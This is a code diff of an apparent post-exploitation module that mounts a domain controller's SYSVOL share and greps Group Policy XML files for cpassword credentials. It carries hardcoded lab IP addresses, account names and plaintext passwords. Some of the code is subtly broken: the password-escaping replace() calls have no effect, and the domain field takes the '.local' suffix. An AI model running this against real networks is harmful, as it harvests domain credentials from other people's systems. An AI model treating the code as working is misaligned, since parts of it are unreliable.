@@ -45,19 +45,19 @@ class Module:
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'LDAP IP/Hostname',
                 'Required'      :   True,
-                'Value'         :   '192.168.153.134'
+                'Value'         :   '192.168.149.161'
             },
             'BindDN' : {
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'user@penlab.local',
                 'Required'      :   True,
-                'Value'         :   'jdizzle@penlab.local'
+                'Value'         :   'jfrank@penlab.local'
             },
             'password' : {
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Password to connect to LDAP',
                 'Required'      :   False,
-                'Value'         :   'Bieber15#'
+                'Value'         :   'MgMt4L!fe'
             }
         }
 
@@ -75,7 +75,6 @@ class Module:
                 option, value = param
                 if option in self.options:
                     self.options[option]['Value'] = value
-
 
     def generate(self):
         
@@ -95,12 +94,17 @@ import sys, os, subprocess, re
 BindDN = "%s"
 LDAPAddress = "%s"
 password = "%s"
+password.replace('!','%%21')
+password.replace('#','%%23')
+password.replace('$','%%24')
 
 regex = re.compile('.+@([^.]+)\..+')
 global tld
 match = re.match(regex, BindDN)
 tld = match.group(1)
 global ext
+global name
+name = BindDN.split('@')[0]
 ext = BindDN.split('.')[1]
 
 
@@ -110,19 +114,18 @@ output2 = subprocess.Popen(["grep", "name:"],stdin=output.stdout, stdout=subproc
 output.stdout.close()
 out,err = output2.communicate()
 
-# Add password.replace()
 
 print subprocess.Popen('mkdir /Volumes/sysvol', shell=True, stdout=subprocess.PIPE).stdout.read()
 
-cmd = \"""mount_smbfs //'PENLAB;jdizzle:Bieber15%%23'@{}/SYSVOL /Volumes/sysvol""\".format(LDAPAddress)
+cmd = \"""mount_smbfs //'{};{}:{}'@{}/SYSVOL /Volumes/sysvol""\".format(ext,name,password,LDAPAddress)
 print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
 print "Searching for Passwords...This may take some time"
 xmls = subprocess.Popen('find /Volumes/sysvol -name *.xml', shell=True, stdout=subprocess.PIPE).stdout.read()
 cmd1 = \"""cat {}""\".format(xmls)
 result = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE).stdout.read()
 print ""
-for usermatch in re.findall(r'userName="(.*?)"|newName="(.*?)"|cpassword="(.*?)"', result, re.DOTALL):
-    print usermatch
+for usermatch in re.finditer(r'userName="(.*?)"|newName="(.*?)"|cpassword="(.*?)"', result, re.DOTALL):
+    print usermatch.group(0)
 
 
 
